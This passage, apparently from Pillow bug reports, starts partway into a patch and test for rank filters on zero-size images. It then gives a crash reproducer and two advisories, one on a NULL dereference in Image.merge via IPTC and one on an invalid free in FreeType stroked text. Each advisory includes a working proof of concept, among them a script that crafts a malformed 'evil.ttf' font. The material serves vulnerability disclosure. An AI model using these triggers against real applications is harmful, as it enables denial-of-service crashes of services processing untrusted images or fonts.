a/Tests/test_image_filter.py +++ b/Tests/test_image_filter.py @@ -155,6 +155,23 @@ def test_rankfilter_error(filter: ImageFilter.RankFilter) -> None: im.filter(filter).getpixel((1, 1)) +@pytest.mark.parametrize( + "filter", + ( + ImageFilter.MinFilter, + ImageFilter.MedianFilter, + ImageFilter.MaxFilter, + ImageFilter.RankFilter(3, 2), + ), +) +@pytest.mark.parametrize("size", ((0, 6), (6, 0), (0, 0))) +def test_rankfilter_zero_dimension( + filter: ImageFilter.RankFilter, size: tuple[int, int] +) -> None: + im = Image.new("L", size) + assert im.filter(filter).size == size + + def test_rankfilter_properties() -> None: rankfilter = ImageFilter.RankFilter(3, 2) diff --git a/src/libImaging/Filter.c b/src/libImaging/Filter.c index 3492a871f..d702db5f9 100644 --- a/src/libImaging/Filter.c +++ b/src/libImaging/Filter.c @@ -67,6 +67,17 @@ ImagingExpand(Imaging imIn, int margin) { return (Imaging)ImagingError_ValueError("filter size too large"); } + if (imIn->xsize == 0 || imIn->ysize == 0) { + /* No edge pixels to replicate (and no lines to read from), so + return a zeroed image of the expanded size */ + imOut = ImagingNew(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); + if (!imOut) { + return NULL; + } + ImagingCopyPalette(imOut, imIn); + return imOut; + } + imOut = ImagingNewDirty(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); if (!imOut) { ``` ## The reproducer
Reproducer — repro, 1,333 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # Pillow: rank filters (Median/Min/Max/RankFilter) on a 0-wide or 0-high image # SIGSEGV in ImagingExpand (src/libImaging/Filter.c) - NULL line pointer read. # Each case runs in a child interpreter; BUG if the control returns and any # zero-size case dies of SIGSEGV. import signal, subprocess, sys CHILD = """ import resource; resource.setrlimit(resource.RLIMIT_CORE, (0, 0)) from PIL import Image, ImageFilter im = Image.new("L", (10, 10)).crop(%s) # public API; crop accepts x0==x1 / y0==y1 print(im.size, "->", end=" ", flush=True) print(im.filter(ImageFilter.%s).size) """ def run(box, flt): p = subprocess.run([sys.executable, "-c", CHILD % (box, flt)], capture_output=True, text=True) out = p.stdout.strip() if p.returncode < 0: out += " killed by " + signal.Signals(-p.returncode).name print(f" crop{box!s:<16} {flt:<18} {out}") return p.returncode ctrl = run((3, 0, 4, 10), "MedianFilter(3)") # (1,10): must work rcs = [run((3, 0, 3, 10), "MedianFilter(3)"), # (0,10) run((3, 0, 3, 10), "MaxFilter(5)"), run((0, 3, 10, 3), "MinFilter(3)"), # (10,0) run((3, 3, 3, 3), "RankFilter(3, 4)")] # (0,0) bug = ctrl == 0 and any(rc == -signal.SIGSEGV for rc in rcs) print("BUG" if bug else "OK") ```

summary: Pillow: NULL pointer dereference in Image.merge via an unvalidated band 0
description:
### Summary
`Image.merge()` checks the mode of every input band except band 0. If band 0 is a single-band `I` or `F` image, the native merge routine reads a pixel pointer that is NULL for those modes and the process crashes. The IPTC plugin reaches this from a plain `Image.open()` followed by a load, and IPTC has no magic-byte prefilter, so a crafted file with no recognizable header can drive it.

### Details
The validation loop skips band 0:

- `src/PIL/Image.py:3795` iterates `for band in bands[1:]` and checks mode and size only for those.

For an `I` or `F` image the 8-bit plane `image8` is NULL (only `image32` is set). `ImagingMerge` dereferences `bands[0]->image8[y]` for the multi-band output modes:

- `src/libImaging/Bands.c:302`, `:311`, `:321`

The IPTC loader builds the band list from an attacker-typed sub-image and passes it to merge with the sub-image at index 0:

- `src/PIL/IptcImagePlugin.py:156-160`
- `src/PIL/IptcImagePlugin.py:169` registers the opener with no accept function.

### PoC
```python
from PIL import Image

# Band 0 is a single-band "I" image: its image8 plane is NULL. merge() validates only
# bands[1:], so the native ImagingMerge dereferences the NULL plane for band 0.
band0 = Image.new("I", (4, 4))
Image.merge("RGB", [band0, Image.new("L", (4, 4)), Image.new("L", (4, 4))])
```

Run it:
```
$ python 02_poc.py
Segmentation fault (core dumped)
```

Observed on a source build of commit `3e2ab96`.

Under AddressSanitizer:
```
==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
    #0 ImagingMerge   src/libImaging/Bands.c:311
    #1 _merge         src/_imaging.c:2492
SUMMARY: AddressSanitizer: SEGV src/libImaging/Bands.c:311 in ImagingMerge
```
The null address confirms the dereference of the missing `image8` plane for band 0.

### Impact
NULL pointer dereference in a C extension. A crafted file opened and loaded through the IPTC path crashes the worker process. This is a hard crash, not a Python exception an application can catch.

summary: Pillow: Invalid free in FreeType glyph rendering when a stroker is active
description:
### Summary
When text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.

### Details
`glyph` is declared without a NULL initializer:

- `src/_imagingft.c:848`

The first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:

- `src/_imagingft.c:1010-1013`

In the render loop the glyph is freed at the end of each iteration and not set back to NULL:

- `src/_imagingft.c:1242`

The cleanup frees it whenever a stroker exists:

- `src/_imagingft.c:1253-1256`

`ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.

### PoC
This needs `fontTools` and any base TTF (the example uses one bundled with Pillow's tests). It rewrites glyph "A" to claim 5000 contours in a glyph body far too short for them, so `FT_Load_Glyph` returns an error while the face still opens.

```python
import struct
from fontTools.ttLib import TTFont
from PIL import Image, ImageFont, ImageDraw

SRC = "Tests/fonts/FreeMono.ttf"          # any TTF works as a base
tt = TTFont(SRC)
gid = tt.getGlyphID(tt.getBestCmap()[ord("A")])
loca_long = tt["head"].indexToLocFormat
tt.close()

raw = bytearray(open(SRC, "rb").read())
nt = struct.unpack(">H", raw[4:6])[0]
tbl = {}
for i in range(nt):
    rec = 12 + i * 16
    tag = bytes(raw[rec:rec+4]).decode("latin-1")
    off, length = struct.unpack(">II", raw[rec+8:rec+16])
    tbl[tag] = (off, length)
glyf_off = tbl["glyf"][0]; loca_off = tbl["loca"][0]
if loca_long:
    o0 = struct.unpack_from(">I", raw, loca_off + 4*gid)[0]
else:
    o0 = struct.unpack_from(">H", raw, loca_off + 2*gid)[0] * 2
struct.pack_into(">h", raw, glyf_off + o0, 5000)   # numberOfContours = 5000
open("evil.ttf", "wb").write(raw)

f = ImageFont.truetype("evil.ttf", 20)             # face opens
d = ImageDraw.Draw(Image.new("RGB", (64, 64)))
d.text((0, 0), "A", font=f, stroke_width=2)        # load error -> FT_Done_Glyph on bad pointer
```

Result on the pinned build: `FT_Load_Glyph` returns an error and execution reaches the `glyph_error` cleanup that calls `FT_Done_Glyph(glyph)` (the plugin surfaces `OSError: invalid outline`).

### Impact
Applications that draw text with `stroke_width != 0` using fonts loaded from untrusted bytes can hit an invalid or double free. The correct fix is small: initialize `glyph = NULL` and set it back to NULL after each `FT_Done_Glyph`.
